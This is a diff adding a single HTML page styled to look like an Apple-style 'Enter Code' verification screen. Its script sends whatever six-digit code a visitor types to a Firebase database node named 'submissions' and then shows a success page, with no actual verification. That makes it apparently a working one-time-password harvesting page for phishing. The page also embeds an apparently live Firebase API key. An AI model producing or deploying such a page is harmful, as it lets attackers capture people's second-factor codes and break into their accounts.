@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Code</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f7;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        h2 { margin-bottom: 8px; color: #1d1d1f; }
+        p { color: #86868b; font-size: 14px; margin-bottom: 24px; }
+        .code-inputs { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; }
+        .code-inputs input {
+            width: 45px; height: 55px; font-size: 24px; font-weight: 600;
+            text-align: center; border: 2px solid #d2d2d7; border-radius: 10px;
+            background-color: #fff; transition: all 0.2s ease;
+        }
+        .code-inputs input:focus { border-color: #0071e3; outline: none; box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1); }
+        .submit-btn {
+            width: 100%; padding: 14px; font-size: 16px; font-weight: 600;
+            color: white; background-color: #0071e3; border: none;
+            border-radius: 10px; cursor: pointer; transition: background 0.2s;
+        }
+        .submit-btn:hover { background-color: #0077ed; }
+        .submit-btn:disabled { background-color: #d2d2d7; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Enter Code</h2>
+        <p>Please enter the 6-digit code sent to you.</p>
+        <div class="code-inputs" id="otp-group">
+            <input type="text" maxlength="1" inputmode="numeric">
+            <input type="text" maxlength="1" inputmode="numeric">
+            <input type="text" maxlength="1" inputmode="numeric">
+            <input type="text" maxlength="1" inputmode="numeric">
+            <input type="text" maxlength="1" inputmode="numeric">
+            <input type="text" maxlength="1" inputmode="numeric">
+        </div>
+        <button class="submit-btn" id="btn-verify">Verify</button>
+    </div>
+
+    <script type="module">
+        // 1. Import Realtime Database SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // 2. Your Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBBzmLGITqv1_7kJcsIKrJCeDIhhabEOMo",
+            authDomain: "my-code-checker.firebaseapp.com",
+            databaseURL: "https://my-code-checker-default-rtdb.firebaseio.com", // Double check this in your console
+            projectId: "my-code-checker",
+            storageBucket: "my-code-checker.appspot.com",
+            messagingSenderId: "SENDER_ID",
+            appId: "APP_ID"
+        };
+
+        // 3. Initialize Firebase & Realtime Database
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // UI Logic for auto-focusing next box
+        const inputs = document.querySelectorAll('#otp-group input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value && index < inputs.length - 1) { inputs[index + 1].focus(); }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) { inputs[index - 1].focus(); }
+            });
+        });
+
+        // 4. Submit Logic
+        document.getElementById('btn-verify').addEventListener('click', async () => {
+            const btn = document.getElementById('btn-verify');
+            let code = "";
+            inputs.forEach(input => code += input.value);
+            
+            if(code.length === 6) {
+                try {
+                    btn.disabled = true;
+                    btn.innerText = "Processing...";
+
+                    // Push a new entry to the "submissions" node
+                    const submissionsRef = ref(db, 'submissions');
+                    const newSubmissionRef = push(submissionsRef);
+                    await set(newSubmissionRef, {
+                        otp: code,
+                        timestamp: Date.now()
+                    });
+
+                    window.location.href = "success.html"; 
+
+                } catch (error) {
+                    console.error("Database Error:", error);
+                    alert("Submission failed. Check your Database Rules.");
+                    btn.disabled = false;
+                    btn.innerText = "Verify";
+                }
+            } else {
+                alert("Please enter all 6 digits.");
+            }
+        });
+    </script>
+</body>
+</html>
